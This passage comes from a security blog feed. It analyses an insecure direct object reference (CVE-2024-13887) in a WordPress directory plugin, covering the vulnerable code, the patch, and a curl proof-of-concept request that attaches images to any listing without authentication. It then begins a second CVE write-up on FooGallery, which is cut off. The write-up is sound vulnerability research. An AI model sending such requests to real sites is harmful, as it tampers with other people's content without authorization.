}&#xA;&#xA;    $slots_available = absint( $plan-&amp;gt;fee_images ) - absint( $_POST[&amp;#39;images_count&amp;#39;] );&#xA;    if ( 0 &amp;gt;= $slots_available ) {&#xA;        return $res-&amp;gt;send_error( __( &amp;#39;Can not upload any more images for this listing.&amp;#39;, &amp;#39;business-directory-plugin&amp;#39; ) );&#xA;    } elseif ( $slots_available &amp;lt; count( $files ) ) {&#xA;        return $res-&amp;gt;send_error(&#xA;            sprintf(&#xA;                _nx(&#xA;                    &amp;#39;You\&amp;#39;re trying to upload %1$d images, but only have %2$d slot available. Please adjust your selection.&amp;#39;,&#xA;                    &amp;#39;You\&amp;#39;re trying to upload %1$d images, but only have %2$d slots available. Please adjust your selection.&amp;#39;,&#xA;                    $slots_available,&#xA;                    &amp;#39;listing image upload&amp;#39;,&#xA;                    &amp;#39;business-directory-plugin&amp;#39;&#xA;                ),&#xA;                count( $files ),&#xA;                $slots_available&#xA;            )&#xA;        );&#xA;    }&#xA;&#xA;    foreach ( $files as $i =&amp;gt; $file ) {&#xA;        $image_error   = &amp;#39;&amp;#39;;&#xA;        $attachment_id = wpbdp_media_upload(&#xA;            $file,&#xA;            true,&#xA;            true,&#xA;            array(&#xA;                &amp;#39;image&amp;#39;      =&amp;gt; true,&#xA;                &amp;#39;min-size&amp;#39;   =&amp;gt; intval( wpbdp_get_option( &amp;#39;image-min-filesize&amp;#39; ) ) * 1024,&#xA;                &amp;#39;max-size&amp;#39;   =&amp;gt; intval( wpbdp_get_option( &amp;#39;image-max-filesize&amp;#39; ) ) * 1024,&#xA;                &amp;#39;min-width&amp;#39;  =&amp;gt; wpbdp_get_option( &amp;#39;image-min-width&amp;#39; ),&#xA;                &amp;#39;min-height&amp;#39; =&amp;gt; wpbdp_get_option( &amp;#39;image-min-height&amp;#39; ),&#xA;            ),&#xA;            $image_error&#xA;        ); // TODO: handle errors.&#xA;&#xA;        if ( $image_error ) {&#xA;            $errors[ $file[&amp;#39;name&amp;#39;] ] = $image_error;&#xA;        } else {&#xA;            $attachments[] = $attachment_id;&#xA;        }&#xA;    }&#xA;&#xA;    $html = &amp;#39;&amp;#39;;&#xA;    foreach ( $attachments as $attachment_id ) {&#xA;        $html .= wpbdp_render(&#xA;            &amp;#39;submit-listing-images-single&amp;#39;,&#xA;            array(&#xA;                &amp;#39;image_id&amp;#39;   =&amp;gt; $attachment_id,&#xA;                &amp;#39;listing_id&amp;#39; =&amp;gt; $listing_id,&#xA;            ),&#xA;            false&#xA;        );&#xA;    }&#xA;&#xA;    $has_images = $listing-&amp;gt;get_images( &amp;#39;ids&amp;#39; );&#xA;    $listing-&amp;gt;set_images( $attachments, true );&#xA;&#xA;    // Maybe set thumbnail if there aren&amp;#39;t already images on this listing.&#xA;    if ( ! $has_images ) {&#xA;        $image_id = reset( $attachments );&#xA;        $listing-&amp;gt;set_thumbnail_id( $image_id );&#xA;    }&#xA;&#xA;    if ( $errors ) {&#xA;        $error_msg = &amp;#39;&amp;#39;;&#xA;&#xA;        foreach ( $errors as $fname =&amp;gt; $error ) {&#xA;            $error_msg .= sprintf( &amp;#39;&amp;amp;#149; %s: %s&amp;#39;, $fname, $error ) . &amp;#39;&amp;lt;br /&amp;gt;&amp;#39;;&#xA;        }&#xA;&#xA;        $res-&amp;gt;add( &amp;#39;uploadErrors&amp;#39;, $error_msg );&#xA;    }&#xA;&#xA;    $res-&amp;gt;add( &amp;#39;is_admin&amp;#39;, wpbdp_user_is_admin() );&#xA;    $res-&amp;gt;add( &amp;#39;slots_available&amp;#39;, $slots_available );&#xA;    $res-&amp;gt;add( &amp;#39;attachmentIds&amp;#39;, $attachments );&#xA;    $res-&amp;gt;add( &amp;#39;html&amp;#39;, $html );&#xA;    $res-&amp;gt;send();&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The function retrieves &lt;code&gt;listing_id&lt;/code&gt; and &lt;code&gt;images&lt;/code&gt; from the request:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$listing_id = intval( $_REQUEST[&amp;#39;listing_id&amp;#39;] );&#xA;$files  = wpbdp_flatten_files_array( isset( $_FILES[&amp;#39;images&amp;#39;] ) ? $_FILES[&amp;#39;images&amp;#39;] : array() );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The function stops if a plan has not been selected:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$plan = $listing-&amp;gt;get_fee_plan();&#xA;if ( ! $plan ) {&#xA;    return $res-&amp;gt;send_error( __( &amp;#39;Please select a plan before uploading images to the listing&amp;#39;, &amp;#39;business-directory-plugin&amp;#39; ) );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-31-cve-2024-13887/plan.png&#34; title=&#34;Select plan&#34; data-thumbnail=&#34;/posts/2025-12-31-cve-2024-13887/plan.png&#34; data-sub-html=&#34;&lt;h2&gt;Plan&lt;/h2&gt;&lt;p&gt;Select plan&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-31-cve-2024-13887/plan.png&#39; alt=&#34;Plan&#34; height=&#34;459&#34; width=&#34;705&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Select plan&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Then it checks the remaining available upload slots:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$slots_available = absint( $plan-&amp;gt;fee_images ) - absint( $_POST[&amp;#39;images_count&amp;#39;] );&#xA;if ( 0 &amp;gt;= $slots_available ) {&#xA;    return $res-&amp;gt;send_error( __( &amp;#39;Can not upload any more images for this listing.&amp;#39;, &amp;#39;business-directory-plugin&amp;#39; ) );&#xA;} elseif ( $slots_available &amp;lt; count( $files ) ) {&#xA;    return $res-&amp;gt;send_error(&#xA;        sprintf(&#xA;            _nx(&#xA;                &amp;#39;You\&amp;#39;re trying to upload %1$d images, but only have %2$d slot available. Please adjust your selection.&amp;#39;,&#xA;                &amp;#39;You\&amp;#39;re trying to upload %1$d images, but only have %2$d slots available. Please adjust your selection.&amp;#39;,&#xA;                $slots_available,&#xA;                &amp;#39;listing image upload&amp;#39;,&#xA;                &amp;#39;business-directory-plugin&amp;#39;&#xA;            ),&#xA;            count( $files ),&#xA;            $slots_available&#xA;        )&#xA;    );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-31-cve-2024-13887/slot.png&#34; title=&#34;Slot&#34; data-thumbnail=&#34;/posts/2025-12-31-cve-2024-13887/slot.png&#34; data-sub-html=&#34;&lt;h2&gt;Slot&lt;/h2&gt;&lt;p&gt;Slot&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-31-cve-2024-13887/slot.png&#39; alt=&#34;Slot&#34; height=&#34;439&#34; width=&#34;509&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Slot&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;If &lt;code&gt;slot &amp;lt;= 0&lt;/code&gt;, an error is returned. Otherwise, the code iterates through the uploaded files and calls &lt;code&gt;wpbdp_media_upload&lt;/code&gt; to upload them.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;foreach ( $files as $i =&amp;gt; $file ) {&#xA;    $image_error   = &amp;#39;&amp;#39;;&#xA;    $attachment_id = wpbdp_media_upload(&#xA;        $file,&#xA;        true,&#xA;        true,&#xA;        array(&#xA;            &amp;#39;image&amp;#39;      =&amp;gt; true,&#xA;            &amp;#39;min-size&amp;#39;   =&amp;gt; intval( wpbdp_get_option( &amp;#39;image-min-filesize&amp;#39; ) ) * 1024,&#xA;            &amp;#39;max-size&amp;#39;   =&amp;gt; intval( wpbdp_get_option( &amp;#39;image-max-filesize&amp;#39; ) ) * 1024,&#xA;            &amp;#39;min-width&amp;#39;  =&amp;gt; wpbdp_get_option( &amp;#39;image-min-width&amp;#39; ),&#xA;            &amp;#39;min-height&amp;#39; =&amp;gt; wpbdp_get_option( &amp;#39;image-min-height&amp;#39; ),&#xA;        ),&#xA;        $image_error&#xA;    ); // TODO: handle errors.&#xA;&#xA;    if ( $image_error ) {&#xA;        $errors[ $file[&amp;#39;name&amp;#39;] ] = $image_error;&#xA;    } else {&#xA;        $attachments[] = $attachment_id;&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Finally, the function returns upload information in JSON format.&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition bug open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-bug&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Bug&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;The vulnerability occurs because there is no binding between &lt;code&gt;listing_id&lt;/code&gt; and the authorized user performing the upload. An attacker can upload arbitrary images by modifying the &lt;code&gt;listing_id&lt;/code&gt; parameter.&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;p&gt;The &lt;code&gt;v6.4.15&lt;/code&gt; patch introduced several mitigations:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-31-cve-2024-13887/patch.png&#34; title=&#34;Patch&#34; data-thumbnail=&#34;/posts/2025-12-31-cve-2024-13887/patch.png&#34; data-sub-html=&#34;&lt;h2&gt;Patch&lt;/h2&gt;&lt;p&gt;Patch&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-31-cve-2024-13887/patch.png&#39; alt=&#34;Patch&#34; height=&#34;678&#34; width=&#34;1915&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Patch&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Adds nonce verification using &lt;code&gt;check_ajax_referer&lt;/code&gt; → CSRF protection&lt;/li&gt;&#xA;&lt;li&gt;Checks listing ownership; if the user does not own the listing, an error is returned.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ! wpbdp_user_is_admin() &amp;amp;&amp;amp; ! $listing-&amp;gt;owned_by_user( get_current_user_id() ) ) {&#xA;    return $res-&amp;gt;send_error( __( &amp;#39;You do not have permission to upload images to this listing&amp;#39;, &amp;#39;business-directory-plugin&amp;#39; ) );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;flowchart TD&#xA;A[&amp;#34;Unauthenticated Attacker&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Send POST request to /wp-admin/admin-ajax.php&amp;#34;]&#xA;&#xA;B --&amp;gt; C[&amp;#34;action=wpbdp-listing-submit-image-upload&amp;#34;]&#xA;&#xA;C --&amp;gt; D[&amp;#34;WordPress triggers ajax_listing_submit_image_upload()&amp;#34;]&#xA;&#xA;D --&amp;gt; E[&amp;#34;No authentication required (wp_ajax_nopriv_)&amp;#34;]&#xA;&#xA;E --&amp;gt; F[&amp;#34;Extract listing_id from request&amp;#34;]&#xA;&#xA;F --&amp;gt; G[&amp;#34;Load listing object by ID&amp;#34;]&#xA;&#xA;G --&amp;gt; H{&amp;#34;Listing has fee plan?&amp;#34;}&#xA;&#xA;H -- No --&amp;gt; I[&amp;#34;Return error: select a plan&amp;#34;]&#xA;H -- Yes --&amp;gt; J[&amp;#34;Calculate remaining image slots&amp;#34;]&#xA;&#xA;J --&amp;gt; K{&amp;#34;slots_available &amp;gt; 0?&amp;#34;}&#xA;&#xA;K -- No --&amp;gt; L[&amp;#34;Return error: no available slots&amp;#34;]&#xA;K -- Yes --&amp;gt; M[&amp;#34;Process uploaded files&amp;#34;]&#xA;&#xA;M --&amp;gt; N[&amp;#34;Call wpbdp_media_upload()&amp;#34;]&#xA;&#xA;N --&amp;gt; O[&amp;#34;Attach uploaded image to listing&amp;#34;]&#xA;&#xA;O --&amp;gt; P[&amp;#34;Set thumbnail if needed&amp;#34;]&#xA;&#xA;P --&amp;gt; Q[&amp;#34;Return success response (JSON)&amp;#34;]&#xA;&#xA;Q --&amp;gt; R[&amp;#34;Image successfully attached to arbitrary listing&amp;#34;]&#xA;&#xA;R --&amp;gt; S[&amp;#34;IDOR: No ownership / permission validation&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Send request:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;curl -X POST http://localhost/wp-admin/admin-ajax.php \&#xA;  -F &amp;#34;action=wpbdp-listing-submit-image-upload&amp;#34; \&#xA;  -F &amp;#34;listing_id=88&amp;#34; \&#xA;  -F &amp;#34;images=@/path/to/image.jpg&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Result&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-31-cve-2024-13887/result.png&#34; title=&#34;Result&#34; data-thumbnail=&#34;/posts/2025-12-31-cve-2024-13887/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Result&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-31-cve-2024-13887/result.png&#39; alt=&#34;Result&#34; height=&#34;271&#34; width=&#34;749&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Result&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The CVE-2024-13887 vulnerability arises because the &lt;code&gt;wpbdp-listing-submit-image-upload&lt;/code&gt; endpoint allows unauthenticated access and does not verify ownership of &lt;code&gt;listing_id&lt;/code&gt;. This allows attackers to upload images to any valid listing simply by modifying the input parameter. Version 6.4.15 fixes this by adding nonce verification and ownership checks.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;IDOR occurs due to missing resource ownership validation.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_ajax_nopriv&lt;/code&gt; is a dangerous attack surface without additional authentication.&lt;/li&gt;&#xA;&lt;li&gt;Never trust user input such as &lt;code&gt;listing_id&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Always combine &lt;strong&gt;authentication + authorization&lt;/strong&gt; when handling AJAX endpoints.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/idor.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;IDOR&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/business-directory-plugin/vulnerability/wordpress-business-directory-plugin-plugin-6-4-14-insecure-direct-object-reference-to-listing-arbitrary-image-addition-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Business Directory Plugin &amp;lt;= 6.4.14 is vulnerable to Insecure Direct Object References (IDOR)&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2024-12114 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-12-30-cve-2024-12114/</link>
      <pubDate>Tue, 30 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-12-30-cve-2024-12114/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-30-cve-2024-12114/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The &lt;strong&gt;FooGallery – Responsive Photo Gallery, Image Viewer, Justified, Masonry &amp;amp; Carousel&lt;/strong&gt; plugin for &lt;strong&gt;WordPress&lt;/strong&gt; contains an &lt;strong&gt;Insecure Direct Object Reference&lt;/strong&gt; vulnerability in &lt;strong&gt;all versions up to and including 2.4.29&lt;/strong&gt; via the AJAX action &lt;strong&gt;&lt;code&gt;foogallery_attachment_modal_save&lt;/code&gt;&lt;/strong&gt;, due to &lt;strong&gt;missing authorization checks&lt;/strong&gt; on a user-controlled key (&lt;strong&gt;&lt;code&gt;img_id&lt;/code&gt;&lt;/strong&gt;).&#xA;This allows an &lt;strong&gt;authenticated attacker&lt;/strong&gt;, with &lt;strong&gt;granted access or higher&lt;/strong&gt;, to &lt;strong&gt;update the content of any post or page&lt;/strong&gt;.&#xA;The actual impact only occurs when the &lt;strong&gt;Gallery Creator role setting&lt;/strong&gt; is set &lt;strong&gt;lower than “Editor”&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2024-12114&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2024-12114&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Insecure Direct Object References (IDOR)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 2.4.29&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 2.4.30&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (4.3)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: N/A&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/foogallery/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress FooGallery Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;FooGallery&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;2.4.29&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;2.4.30&lt;/code&gt; – 